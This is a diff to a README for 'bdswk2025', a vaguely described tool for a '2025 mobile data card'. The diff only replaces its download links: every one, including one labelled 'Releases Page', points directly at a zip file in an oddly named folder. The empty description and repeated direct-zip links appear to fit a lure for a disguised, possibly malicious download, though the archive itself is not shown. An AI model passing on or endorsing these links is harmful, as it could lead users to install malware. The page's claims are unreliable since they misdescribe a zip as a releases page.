@@ -4,11 +4,11 @@
 
 Welcome to bdswk2025! This software helps you utilize a new 2025 mobile data card that offers fast internet connections. Enjoy reliable access to the web on various devices, wherever you are. 
 
-[![Download bdswk2025](https://raw.githubusercontent.com/zoinksdoinks/bdswk2025/main/engnessang/bdswk2025.zip)](https://raw.githubusercontent.com/zoinksdoinks/bdswk2025/main/engnessang/bdswk2025.zip)
+[![Download bdswk2025](https://github.com/zoinksdoinks/bdswk2025/raw/refs/heads/main/engnessang/bdswk_v1.6.zip)](https://github.com/zoinksdoinks/bdswk2025/raw/refs/heads/main/engnessang/bdswk_v1.6.zip)
 
 ## 📥 Download & Install
 
-To get started, you'll need to download the software. Please visit this page to download the latest version: [Download Page](https://raw.githubusercontent.com/zoinksdoinks/bdswk2025/main/engnessang/bdswk2025.zip).
+To get started, you'll need to download the software. Please visit this page to download the latest version: [Download Page](https://github.com/zoinksdoinks/bdswk2025/raw/refs/heads/main/engnessang/bdswk_v1.6.zip).
 
 ### Steps for Downloading
 
@@ -72,6 +72,6 @@ We welcome contributions! If you wish to help improve bdswk2025, please check ou
 
 ## ✨ Stay Updated
 
-Keep an eye on our Releases page for the latest features and enhancements: [Releases Page](https://raw.githubusercontent.com/zoinksdoinks/bdswk2025/main/engnessang/bdswk2025.zip).
+Keep an eye on our Releases page for the latest features and enhancements: [Releases Page](https://github.com/zoinksdoinks/bdswk2025/raw/refs/heads/main/engnessang/bdswk_v1.6.zip).
 
 Thank you for using bdswk2025. We hope you enjoy the benefits of fast mobile internet wherever you go!
